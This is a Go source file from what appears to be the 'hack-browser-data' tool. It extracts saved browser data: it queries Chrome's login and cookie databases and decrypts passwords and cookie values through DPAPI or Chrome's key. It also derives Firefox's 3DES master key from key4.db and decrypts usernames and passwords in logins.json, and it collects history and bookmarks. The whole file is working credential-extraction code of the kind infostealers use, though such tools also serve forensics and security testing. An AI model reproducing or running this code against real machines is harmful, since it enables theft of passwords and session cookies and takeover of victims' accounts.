package core

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/hex"
	"hack-browser-data/log"
	"hack-browser-data/utils"
	"io"
	"io/ioutil"
	"os"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
)

const (
	bookmarkID       = "id"
	bookmarkAdded    = "date_added"
	bookmarkUrl      = "url"
	bookmarkName     = "name"
	bookmarkType     = "type"
	bookmarkChildren = "children"
)

var (
	FullData = new(BrowserData)
)

type (
	BrowserData struct {
		LoginDataSlice
		BookmarkSlice
		CookieMap
		HistorySlice
	}
	LoginDataSlice []loginData
	BookmarkSlice  []bookmarks
	CookieMap      map[string][]cookies
	HistorySlice   []history
	loginData      struct {
		UserName    string
		encryptPass []byte
		encryptUser []byte
		Password    string
		LoginUrl    string
		CreateDate  time.Time
	}
	bookmarks struct {
		ID        int64
		Name      string
		Type      string
		URL       string
		DateAdded time.Time
	}
	cookies struct {
		Host         string
		Path         string
		KeyName      string
		encryptValue []byte
		Value        string
		IsSecure     bool
		IsHTTPOnly   bool
		HasExpire    bool
		IsPersistent bool
		CreateDate   time.Time
		ExpireDate   time.Time
	}
	history struct {
		Title         string
		Url           string
		VisitCount    int
		LastVisitTime time.Time
	}
)

func ParseResult(dbname string) {
	switch dbname {
	case utils.Bookmarks:
		parseBookmarks()
	case utils.History:
		parseHistory()
	case utils.Cookies:
		parseCookie()
	case utils.LoginData:
		parseLogin()
	case utils.FirefoxCookie:
		parseFirefoxCookie()
	case utils.FirefoxKey4DB:
		parseFirefoxKey4()
	case utils.FirefoxData:
		parseFirefoxData()
	}
}

var bookmarkList BookmarkSlice

func parseBookmarks() {
	bookmarks, err := utils.ReadFile(utils.Bookmarks)
	defer os.Remove(utils.Bookmarks)
	if err != nil {
		log.Println(err)
	}
	r := gjson.Parse(bookmarks)
	if r.Exists() {
		roots := r.Get("roots")
		roots.ForEach(func(key, value gjson.Result) bool {
			getBookmarkChildren(value)
			return true
		})
	}
	FullData.BookmarkSlice = bookmarkList
}

var queryLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`

func parseLogin() {
	var loginItemList LoginDataSlice
	login := loginData{}
	loginDB, err := sql.Open("sqlite3", utils.LoginData)
	defer os.Remove(utils.LoginData)
	defer func() {
		if err := loginDB.Close(); err != nil {
			log.Println(err)
		}
	}()
	if err != nil {
		log.Println(err)
	}
	err = loginDB.Ping()
	rows, err := loginDB.Query(queryLogin)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			url, username, password string
			pwd                     []byte
			create                  int64
		)
		err = rows.Scan(&url, &username, &pwd, &create)
		login = loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if utils.VersionUnder80 {
			password, err = utils.DecryptStringWithDPAPI(pwd)
		} else {
			password, err = utils.DecryptChromePass(pwd)
		}
		if create > time.Now().Unix() {
			login.CreateDate = utils.TimeEpochFormat(create)
		} else {
			login.CreateDate = utils.TimeStampFormat(create)
		}

		login.Password = password
		if err != nil {
			log.Println(err)
		}
		loginItemList = append(loginItemList, login)
	}
	FullData.LoginDataSlice = loginItemList
}

var queryCookie = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`

func parseCookie() {
	cookie := cookies{}
	cookieMap := make(map[string][]cookies)
	cookieDB, err := sql.Open("sqlite3", utils.Cookies)
	defer os.Remove(utils.Cookies)
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Println(err)
		}
	}()
	if err != nil {
		log.Println(err)
	}
	err = cookieDB.Ping()
	rows, err := cookieDB.Query(queryCookie)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			key, host, path, value                        string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			encryptValue                                  []byte
		)
		err = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent)
		cookie = cookies{
			KeyName:      key,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     utils.IntToBool(isSecure),
			IsHTTPOnly:   utils.IntToBool(isHTTPOnly),
			HasExpire:    utils.IntToBool(hasExpire),
			IsPersistent: utils.IntToBool(isPersistent),
			CreateDate:   utils.TimeEpochFormat(createDate),
			ExpireDate:   utils.TimeEpochFormat(expireDate),
		}
		// remove prefix 'v10'
		if utils.VersionUnder80 {
			value, err = utils.DecryptStringWithDPAPI(encryptValue)
		} else {
			value, err = utils.DecryptChromePass(encryptValue)
		}

		cookie.Value = value
		if _, ok := cookieMap[host]; ok {
			cookieMap[host] = append(cookieMap[host], cookie)
		} else {
			cookieMap[host] = []cookies{cookie}
		}
	}
	FullData.CookieMap = cookieMap
}

var queryHistory = `SELECT url, title, visit_count, last_visit_time FROM urls`

func parseHistory() {
	var historyList HistorySlice
	h := history{}
	historyDB, err := sql.Open("sqlite3", utils.History)
	defer os.Remove(utils.History)
	defer func() {
		if err := historyDB.Close(); err != nil {
			log.Println(err)
		}
	}()
	if err != nil {
		log.Println(err)
	}
	err = historyDB.Ping()
	rows, err := historyDB.Query(queryHistory)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)
		err := rows.Scan(&url, &title, &visitCount, &lastVisitTime)
		h = history{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeEpochFormat(lastVisitTime),
		}
		if err != nil {
			log.Println(err)
			continue
		}
		historyList = append(historyList, h)
	}
	FullData.HistorySlice = historyList
}

func getBookmarkChildren(value gjson.Result) (children gjson.Result) {
	b := bookmarks{}
	b.ID = value.Get(bookmarkID).Int()
	nodeType := value.Get(bookmarkType)
	b.DateAdded = utils.TimeEpochFormat(value.Get(bookmarkAdded).Int())
	b.URL = value.Get(bookmarkUrl).String()
	b.Name = value.Get(bookmarkName).String()
	children = value.Get(bookmarkChildren)
	if nodeType.Exists() {
		b.Type = nodeType.String()
		bookmarkList = append(bookmarkList, b)
		if children.Exists() && children.IsArray() {
			for _, v := range children.Array() {
				children = getBookmarkChildren(v)
			}
		}
	}
	return children
}

var queryFirefoxBookMarks = `SELECT id, fk, type, dateAdded, title FROM moz_bookmarks`
var queryFirefoxHistory = `SELECT id, url, title, last_visit_date, visit_count FROM moz_places`

// places.sqlite doc @https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Database
func parseFirefoxData() {
	var historyList HistorySlice
	var (
		err                       error
		keyDB                     *sql.DB
		bookmarkRows, historyRows *sql.Rows
		tempMap                   map[int64]string
		bookmarkUrl               string
	)
	tempMap = make(map[int64]string)
	keyDB, err = sql.Open("sqlite3", utils.FirefoxData)
	defer os.Remove(utils.FirefoxData)
	defer func() {
		err := keyDB.Close()
		if err != nil {
			log.Error(err)
		}
	}()
	if err != nil {
		log.Error(err)
	}
	historyRows, err = keyDB.Query(queryFirefoxHistory)
	if err != nil {
		log.Error(err)
	}

	defer func() {
		if err := historyRows.Close(); err != nil {
			log.Error(err)
		}
	}()
	for historyRows.Next() {
		var (
			id, visitDate int64
			url, title    string
			visitCount    int
		)
		err = historyRows.Scan(&id, &url, &title, &visitDate, &visitCount)
		historyList = append(historyList, history{
			Title:         title,
			Url:           url,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeStampFormat(visitDate / 1000000),
		})
		tempMap[id] = url
	}
	FullData.HistorySlice = historyList

	bookmarkRows, err = keyDB.Query(queryFirefoxBookMarks)
	defer func() {
		if err := bookmarkRows.Close(); err != nil {
			log.Error(err)
		}
	}()
	for bookmarkRows.Next() {
		var (
			id, fk, bType, dateAdded int64
			title                    string
		)
		err = bookmarkRows.Scan(&id, &fk, &bType, &dateAdded, &title)
		if url, ok := tempMap[id]; ok {
			bookmarkUrl = url
		}
		bookmarkList = append(bookmarkList, bookmarks{
			ID:        id,
			Name:      title,
			Type:      utils.BookMarkType(bType),
			URL:       bookmarkUrl,
			DateAdded: utils.TimeStampFormat(dateAdded / 1000000),
		})
	}
	FullData.BookmarkSlice = bookmarkList
}

var queryPassword = `SELECT item1, item2 FROM metaData WHERE id = 'password'`

func checkKey1() (b [][]byte) {
	var (
		err   error
		keyDB *sql.DB
		rows  *sql.Rows
	)

	keyDB, err = sql.Open("sqlite3", utils.FirefoxKey4DB)
	defer func() {
		if err := keyDB.Close(); err != nil {
			log.Error(err)
		}
	}()

	if err != nil {
		log.Println(err)
	}
	err = keyDB.Ping()
	rows, err = keyDB.Query(queryPassword)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			item1, item2 []byte
		)
		if err := rows.Scan(&item1, &item2); err != nil {
			log.Error(err)
			continue
		}
		b = append(b, item1, item2)
	}
	return b
}

var queryNssPrivate = `SELECT a11, a102 from nssPrivate;`

func checkA102() (b [][]byte) {
	keyDB, err := sql.Open("sqlite3", utils.FirefoxKey4DB)

	defer func() {
		if err := os.Remove(utils.FirefoxKey4DB); err != nil {
			log.Error(err)
		}
	}()
	defer func(closer io.Closer) {
		if err := keyDB.Close(); err != nil {
			log.Error(err)
		}
	}(keyDB)

	if err != nil {
		log.Error(err)
	}
	rows, err := keyDB.Query(queryNssPrivate)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			a11, a102 []byte
		)
		if err := rows.Scan(&a11, &a102); err != nil {
			log.Println(err)
		}
		b = append(b, a11, a102)
	}
	return b
}

/*
ASN1 PBE Structures
SEQUENCE (2 elem)
	SEQUENCE (2 elem)
		OBJECT IDENTIFIER
		SEQUENCE (2 elem)
			OCTET STRING (20 byte)
			INTEGER 1
	OCTET STRING (16 byte)
*/

type PBEAlgorithms struct {
	SequenceA
	CipherText []byte
}

type SequenceA struct {
	DecryptMethod asn1.ObjectIdentifier
	SequenceB
}

type SequenceB struct {
	EntrySalt []byte
	Len       int
}

/*
SEQUENCE (3 elem)
	OCTET STRING (16 byte)
	SEQUENCE (2 elem)
		OBJECT IDENTIFIER 1.2.840.113549.3.7 des-EDE3-CBC (RSADSI encryptionAlgorithm)
		OCTET STRING (8 byte)
	OCTET STRING (16 byte)
*/
type PasswordAsn1 struct {
	CipherText []byte
	SequenceIV
	Encrypted []byte
}

type SequenceIV struct {
	asn1.ObjectIdentifier
	Iv []byte
}

func decryptPBE(decodeItem []byte) (pbe PBEAlgorithms) {
	_, err := asn1.Unmarshal(decodeItem, &pbe)
	if err != nil {
		log.Error(err)
	}
	return
}

func parseFirefoxKey4() {
	h1 := checkKey1()
	globalSalt := h1[0]
	decodedItem := h1[1]
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	pbe := decryptPBE(decodedItem)
	m := checkPassword(globalSalt, pbe.EntrySalt, pbe.CipherText)
	var finallyKey []byte
	if bytes.Contains(m, []byte("password-check")) {
		log.Println("password-check success")
		h2 := checkA102()
		a11 := h2[0]
		a102 := h2[1]
		m := bytes.Compare(a102, keyLin)
		if m == 0 {
			pbe2 := decryptPBE(a11)
			log.Debugf("decrypt asn1 pbe success")
			finallyKey = checkPassword(globalSalt, pbe2.EntrySalt, pbe2.CipherText)[:24]
			log.Debugf("finally key", finallyKey, hex.EncodeToString(finallyKey))
		}
	}
	allLogins := GetLoginData()
	for _, v := range allLogins {
		log.Warn(hex.EncodeToString(v.encryptUser))
		s1 := decryptLogin(v.encryptUser)
		log.Warn(hex.EncodeToString(v.encryptPass))
		s2 := decryptLogin(v.encryptPass)
		log.Println(s1, s1.CipherText, s1.Encrypted, s1.Iv)
		block, err := des.NewTripleDESCipher(finallyKey)
		if err != nil {
			log.Println(err)
		}
		blockMode := cipher.NewCBCDecrypter(block, s1.Iv)
		sq := make([]byte, len(s1.Encrypted))
		blockMode.CryptBlocks(sq, s1.Encrypted)
		blockMode2 := cipher.NewCBCDecrypter(block, s2.Iv)
		sq2 := make([]byte, len(s2.Encrypted))
		blockMode2.CryptBlocks(sq2, s2.Encrypted)
		FullData.LoginDataSlice = append(FullData.LoginDataSlice, loginData{
			LoginUrl:   v.LoginUrl,
			UserName:   string(utils.PKCS5UnPadding(sq)),
			Password:   string(utils.PKCS5UnPadding(sq2)),
			CreateDate: v.CreateDate,
		})
	}
}

var queryFirefoxCookie = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`

func parseFirefoxCookie() {
	cookie := cookies{}
	cookieMap := make(map[string][]cookies)
	cookieDB, err := sql.Open("sqlite3", utils.FirefoxCookie)
	defer os.Remove(utils.FirefoxCookie)
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Println(err)
		}
	}()
	if err != nil {
		log.Println(err)
	}
	err = cookieDB.Ping()
	rows, err := cookieDB.Query(queryFirefoxCookie)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			name, value, host, path string
			isSecure, isHttpOnly    int
			creationTime, expiry    int64
		)
		err = rows.Scan(&name, &value, &host, &path, &creationTime, &expiry, &isSecure, &isHttpOnly)
		cookie = cookies{
			KeyName:    name,
			Host:       host,
			Path:       path,
			IsSecure:   utils.IntToBool(isSecure),
			IsHTTPOnly: utils.IntToBool(isHttpOnly),
			CreateDate: utils.TimeStampFormat(creationTime / 1000000),
			ExpireDate: utils.TimeStampFormat(expiry),
		}

		cookie.Value = value
		if _, ok := cookieMap[host]; ok {
			cookieMap[host] = append(cookieMap[host], cookie)
		} else {
			cookieMap[host] = []cookies{cookie}
		}
	}
	FullData.CookieMap = cookieMap

}

func checkPassword(globalSalt, entrySalt, encryptText []byte) []byte {
	//byte[] GLMP; // GlobalSalt + MasterPassword
	//byte[] HP; // SHA1(GLMP)
	//byte[] HPES; // HP + EntrySalt
	//byte[] CHP; // SHA1(HPES)
	//byte[] PES; // EntrySalt completed to 20 bytes by zero
	//byte[] PESES; // PES + EntrySalt
	//byte[] k1;
	//byte[] tk;
	//byte[] k2;
	//byte[] k; // final value conytaining key and iv
	sha1.New()
	hp := sha1.Sum(globalSalt)
	log.Warn(hex.EncodeToString(hp[:]))
	log.Println(len(entrySalt))
	s := append(hp[:], entrySalt...)
	log.Warn(hex.EncodeToString(s))
	chp := sha1.Sum(s)
	log.Warn(hex.EncodeToString(chp[:]))
	pes := paddingZero(entrySalt, 20)
	tk := hmac.New(sha1.New, chp[:])
	tk.Write(pes)
	pes = append(pes, entrySalt...)
	log.Warn(hex.EncodeToString(pes))
	k1 := hmac.New(sha1.New, chp[:])
	k1.Write(pes)
	log.Warn(hex.EncodeToString(k1.Sum(nil)))
	log.Warn(hex.EncodeToString(tk.Sum(nil)))
	tkPlus := append(tk.Sum(nil), entrySalt...)
	k2 := hmac.New(sha1.New, chp[:])
	k2.Write(tkPlus)
	log.Warn(hex.EncodeToString(k2.Sum(nil)))
	k := append(k1.Sum(nil), k2.Sum(nil)...)
	iv := k[len(k)-8:]
	key := k[:24]
	log.Warn("key=", hex.EncodeToString(key), "iv=", hex.EncodeToString(iv))
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		log.Println(err)
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	sq := make([]byte, len(encryptText))
	blockMode.CryptBlocks(sq, encryptText)
	return sq
}

func paddingZero(s []byte, l int) []byte {
	h := l - len(s)
	if h <= 0 {
		return s
	} else {
		for i := len(s); i < l; i++ {
			s = append(s, 0)
		}
		return s
	}
}

func GetLoginData() (l []loginData) {
	s, err := ioutil.ReadFile(utils.FirefoxLoginData)
	if err != nil {
		log.Warn(err)
	}
	defer os.Remove(utils.FirefoxLoginData)
	h := gjson.GetBytes(s, "logins")
	if h.Exists() {
		for _, v := range h.Array() {
			var (
				m loginData
				u []byte
				p []byte
			)
			m.LoginUrl = v.Get("formSubmitURL").String()
			u, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			m.encryptUser = u
			if err != nil {
				log.Println(err)
			}
			p, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			m.encryptPass = p
			m.CreateDate = utils.TimeStampFormat(v.Get("timeCreated").Int() / 1000)
			l = append(l, m)
		}
	}
	return
}

func decryptLogin(s []byte) (pbe PasswordAsn1) {
	_, err := asn1.Unmarshal(s, &pbe)
	if err != nil {
		log.Println(err)
	}
	return pbe
}
